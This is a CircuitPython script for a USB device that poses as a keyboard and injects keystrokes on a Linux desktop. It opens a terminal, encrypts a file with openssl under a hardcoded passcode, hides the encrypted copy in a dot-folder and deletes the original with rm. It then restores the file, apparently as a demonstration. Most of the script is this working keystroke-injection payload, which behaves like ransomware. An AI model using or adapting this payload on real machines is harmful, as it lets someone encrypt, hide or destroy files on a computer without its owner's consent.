import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode
from adafruit_hid.mouse import Mouse

# Initialize the keyboard and mouse
keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(keyboard)
mouse = Mouse(usb_hid.devices)

# Your custom passcode
passcode = "system"  # Replace with your actual passcode

# Function to move the mouse slowly in small steps
def slow_move(x_steps, y_steps, delay=0.01):
    step_size = 5
    steps_x = x_steps // step_size
    steps_y = y_steps // step_size
    for i in range(max(abs(steps_x), abs(steps_y))):
        if i < abs(steps_x):
            mouse.move(x=step_size if x_steps > 0 else -step_size, y=0)
        if i < abs(steps_y):
            mouse.move(x=0, y=step_size if y_steps > 0 else -step_size)
        time.sleep(delay)  # Delay between steps

# Function to open terminal and perform actions
def perform_actions():
    # Wait a few seconds to allow switching to the Linux desktop
    time.sleep(5)

    # Open Terminal (Ctrl + Alt + T)
    keyboard.press(Keycode.CONTROL, Keycode.ALT, Keycode.T)
    keyboard.release_all()
    time.sleep(2)

    # Type commands to lock the file with a password
    layout.write(f"cd Desktop/USB_Project/demo_to_be_deleted\n") 
    time.sleep(1)
    layout.write(f"openssl enc -aes-256-cbc -salt -in del.odt -out del.odt.enc -k {passcode}\n")
    time.sleep(2)

    # Hide the file (move it to a hidden folder)
    layout.write("mkdir -p ~/.hidden_files\n")
    time.sleep(1)
    layout.write("mv del.odt.enc ~/.hidden_files/\n")
    time.sleep(1)

    # Delete the source file (del.odt)
    layout.write("rm del.odt\n")
    time.sleep(1)

    
    time.sleep(5)

    # Restore the file (move it back and decrypt)
    layout.write("mv ~/.hidden_files/del.odt.enc .\n")
    time.sleep(1)
    layout.write(f"openssl enc -d -aes-256-cbc -in del.odt.enc -out del.odt -k {passcode}\n")
    time.sleep(2)
    layout.write("rm del.odt.enc\n")
    time.sleep(1)
perform_actions()


